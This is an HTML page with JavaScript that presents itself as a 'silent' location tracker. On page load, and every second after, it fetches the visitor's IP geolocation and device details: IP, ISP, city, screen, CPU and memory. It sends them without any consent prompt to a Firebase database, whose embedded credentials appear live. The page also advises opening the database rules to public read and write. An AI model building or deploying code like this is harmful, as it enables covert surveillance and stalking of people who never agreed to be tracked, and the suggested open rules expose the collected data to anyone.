<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LRemote Location Tracker</title>
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 600px;
            width: 100%;
        }
        h1 {
            color: #667eea;
            margin-bottom: 10px;
            font-size: 2rem;
        }
        .status {
            padding: 20px;
            background: #f0f9ff;
            border-radius: 10px;
            margin: 20px 0;
            border-left: 4px solid #667eea;
        }
        .status.success { background: #f0fdf4; border-color: #10b981; }
        .status.error { background: #fef2f2; border-color: #ef4444; }
        .counter {
            font-size: 3rem;
            font-weight: bold;
            color: #667eea;
            text-align: center;
            margin: 20px 0;
        }
        .info {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin: 20px 0;
        }
        .info-item {
            padding: 10px;
            background: #f8f9fa;
            border-radius: 8px;
        }
        .info-label {
            font-size: 0.75rem;
            color: #666;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .info-value {
            font-size: 1.1rem;
            font-weight: 600;
            color: #333;
            margin-top: 5px;
        }
        .log {
            background: #1e293b;
            color: #10b981;
            padding: 15px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 0.85rem;
            max-height: 300px;
            overflow-y: auto;
            margin-top: 20px;
        }
        .log-entry { margin: 5px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📍 LRemote Tracker</h1>
        <p style="color: #666;">Silent location tracking - updates every second</p>
        
        <div class="counter" id="counter">0</div>
        <p style="text-align: center; color: #666;">Updates Sent</p>
        
        <div class="status" id="status">
            <strong>⏳ Initializing...</strong>
        </div>
        
        <div class="info" id="locationInfo" style="display: none;">
            <div class="info-item">
                <div class="info-label">Latitude</div>
                <div class="info-value" id="lat">-</div>
            </div>
            <div class="info-item">
                <div class="info-label">Longitude</div>
                <div class="info-value" id="lon">-</div>
            </div>
            <div class="info-item">
                <div class="info-label">City</div>
                <div class="info-value" id="city">-</div>
            </div>
            <div class="info-item">
                <div class="info-label">Country</div>
                <div class="info-value" id="country">-</div>
            </div>
            <div class="info-item">
                <div class="info-label">IP Address</div>
                <div class="info-value" id="ip">-</div>
            </div>
            <div class="info-item">
                <div class="info-label">Device</div>
                <div class="info-value" id="device">-</div>
            </div>
        </div>
        
        <div class="log" id="log"></div>
    </div>

    <script>
        // Firebase Configuration
        const firebaseConfig = {
            apiKey: "AIzaSyBIo8DTwDxop5qs_fV8Xj1szz288GTsTTE",
            authDomain: "lremote-tracking.firebaseapp.com",
            databaseURL: "https://lremote-tracking-default-rtdb.firebaseio.com",
            projectId: "lremote-tracking",
            storageBucket: "lremote-tracking.firebasestorage.app",
            messagingSenderId: "868168422314",
            appId: "1:868168422314:web:ca2870eab835f522cf91d3"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        let updateCount = 0;
        let lastLocation = null;

        function log(message, type = 'info') {
            const logDiv = document.getElementById('log');
            const timestamp = new Date().toLocaleTimeString();
            const colors = {
                info: '#60a5fa',
                success: '#10b981',
                error: '#ef4444',
                warning: '#f59e0b'
            };
            logDiv.innerHTML += `<div class="log-entry" style="color: ${colors[type] || colors.info}">[${timestamp}] ${message}</div>`;
            logDiv.scrollTop = logDiv.scrollHeight;
        }

        function updateStatus(message, type = 'info') {
            const statusDiv = document.getElementById('status');
            statusDiv.className = `status ${type}`;
            statusDiv.innerHTML = `<strong>${message}</strong>`;
        }

        function updateUI(data) {
            document.getElementById('counter').textContent = updateCount;
            document.getElementById('locationInfo').style.display = 'grid';
            document.getElementById('lat').textContent = data.latitude?.toFixed(6) || '-';
            document.getElementById('lon').textContent = data.longitude?.toFixed(6) || '-';
            document.getElementById('city').textContent = data.city || '-';
            document.getElementById('country').textContent = data.country || '-';
            document.getElementById('ip').textContent = data.ipAddress || '-';
            document.getElementById('device').textContent = data.deviceName || '-';
        }

        function getDeviceName() {
            const ua = navigator.userAgent;
            if (ua.match(/Android/i)) return 'Android Device';
            if (ua.match(/iPhone/i)) return 'iPhone';
            if (ua.match(/iPad/i)) return 'iPad';
            if (ua.match(/Windows/i)) return 'Windows PC';
            if (ua.match(/Macintosh/i)) return 'Mac';
            if (ua.match(/Linux/i)) return 'Linux PC';
            return 'Unknown Device';
        }

        function getScreenResolution() {
            return `${screen.width}x${screen.height}`;
        }

        // Track location using IP-API
        async function trackLocation() {
            try {
                log('📡 Fetching location from ip-api.com...');
                
                // Using JSONP approach via script tag to avoid CORS
                const script = document.createElement('script');
                script.src = 'http://ip-api.com/json/?callback=handleIPData';
                document.body.appendChild(script);
                
            } catch (error) {
                log(`❌ Error: ${error.message}`, 'error');
            }
        }

        // Global callback for IP-API
        window.handleIPData = function(data) {
            // Remove the script tag
            const scripts = document.querySelectorAll('script[src*="ip-api.com"]');
            scripts.forEach(s => s.remove());
            
            if (data.status === 'fail') {
                log(`❌ IP API failed: ${data.message}`, 'error');
                updateStatus(`❌ Location error: ${data.message}`, 'error');
                return;
            }

            log(`✅ IP API success: ${data.city}, ${data.country}`, 'success');
            
            updateCount++;
            lastLocation = {
                deviceName: getDeviceName(),
                deviceType: navigator.platform,
                screenResolution: getScreenResolution(),
                cpuCores: navigator.hardwareConcurrency || 0,
                deviceMemory: navigator.deviceMemory || 0,
                latitude: data.lat,
                longitude: data.lon,
                accuracy: 'IP-based (approximate)',
                city: data.city,
                country: data.country,
                countryCode: data.countryCode,
                region: data.regionName,
                zip: data.zip,
                timezone: data.timezone,
                ipAddress: data.query,
                isp: data.isp,
                organization: data.org,
                locationMethod: 'IP-based (ip-api.com)',
                timestamp: Date.now(),
                collectedAt: new Date().toISOString()
            };

            // Send to Firebase
            sendToFirebase(lastLocation);
            
            // Update UI
            updateUI(lastLocation);
        };

        async function sendToFirebase(locationData) {
            try {
                log('🔥 Sending to Firebase /test/connection...');
                
                // Update /test/connection (for app to read)
                await db.ref('test/connection').update(locationData);
                log(`✅ Sent to /test/connection (Update #${updateCount})`, 'success');
                
                // Also save to /locations (for history)
                await db.ref('locations').push(locationData);
                log(`✅ Saved to /locations history`, 'success');
                
                updateStatus(`✅ Tracking Active | Update #${updateCount}`, 'success');
                
            } catch (error) {
                log(`❌ Firebase error: ${error.message}`, 'error');
                updateStatus(`❌ Firebase error: ${error.message}`, 'error');
                
                if (error.code === 'PERMISSION_DENIED') {
                    log('🔒 SOLUTION: Update Firebase Rules', 'error');
                    log('Go to Firebase Console > Realtime Database > Rules', 'error');
                    log('Set: { ".read": true, ".write": true }', 'error');
                }
            }
        }

        // Start tracking on page load
        window.addEventListener('DOMContentLoaded', () => {
            log('🚀 Starting LRemote Location Tracker...');
            log(`📱 Device: ${getDeviceName()}`);
            log(`🖥️ Screen: ${getScreenResolution()}`);
            
            // Initial track
            trackLocation();
            
            // Track every 1 second
            setInterval(trackLocation, 1000);
            
            log('⏱️ Tracking interval: Every 1 second');
            log('✅ Tracker started successfully!');
        });
    </script>
</body>
</html>
